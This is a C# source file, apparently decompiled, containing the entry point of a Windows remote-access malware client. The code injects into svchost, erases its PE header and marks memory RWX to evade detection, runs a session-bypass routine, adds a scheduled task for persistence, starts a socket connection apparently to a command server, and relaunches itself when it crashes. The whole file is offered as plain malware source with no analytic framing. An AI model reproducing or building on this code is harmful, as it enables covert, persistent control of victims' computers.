using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using client.Properties;
using newClient;
using newClient.Comms;
using newClient.Utilities;

namespace Client;

internal static class Program
{
	[STAThread]
	private static void Main()
	{
		Logger.Info("\r\n\r\n");
		Logger.Info(Process.GetCurrentProcess().ProcessName + "   Main");
		AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;
		AppDomain.CurrentDomain.AssemblyResolve += CurrentDomain_AssemblyResolve;
		Inject.Injectsvchost();
		Logger.Info("Injectsvchost");
		ProcessingCommand.GetProcessingLine();
		Logger.Info("GetProcessingLine");
		ProcessingAPPName.getname();
		Logger.Info("getname");
		ErasePEHeader.SetEraseRWX();
		Logger.Info("SetEraseRWX");
		ErasePEHeader.SetErasePEHeader();
		Logger.Info("SetErasePEHeader");
		MutexUtils.CreateMutex(config.MutexName, config.IsMutex);
		ThreadPool.QueueUserWorkItem(delegate
		{
			bypassSession.Run();
		});
		Logger.Info("CreateMutex");
		AssemblyLoader.otherassamebly.Add("Interop.TaskScheduler", Resources.Interop_TaskScheduler);
		ScheduleTask.CreateTask(Process.GetCurrentProcess().MainModule!.FileName);
		Logger.Info("CreateTask");
		SocketManger.Run();
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
	private static extern IntPtr FindWindowA(string lpClassName, string lpWindowName);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
	private static extern bool SetWindowTextA(IntPtr hWnd, string lpString);

	private static void FindWindow()
	{
	}

	private static Assembly CurrentDomain_AssemblyResolve(object sender, ResolveEventArgs args)
	{
		string name = new AssemblyName(args.Name).Name;
		if (!AssemblyLoader.otherassamebly.ContainsKey(name))
		{
			return null;
		}
		return Assembly.Load(AssemblyLoader.otherassamebly[name]);
	}

	private static void CurrentDomain_UnhandledException(object sender, UnhandledExceptionEventArgs e)
	{
		try
		{
			Logger.Info(e.ExceptionObject.ToString());
			Process currentProcess = Process.GetCurrentProcess();
			shellexec.WinExec(currentProcess.MainModule!.FileName, "exception", Path.GetDirectoryName(currentProcess.MainModule!.FileName), null);
			Process.GetCurrentProcess().Kill();
		}
		catch
		{
		}
	}
}
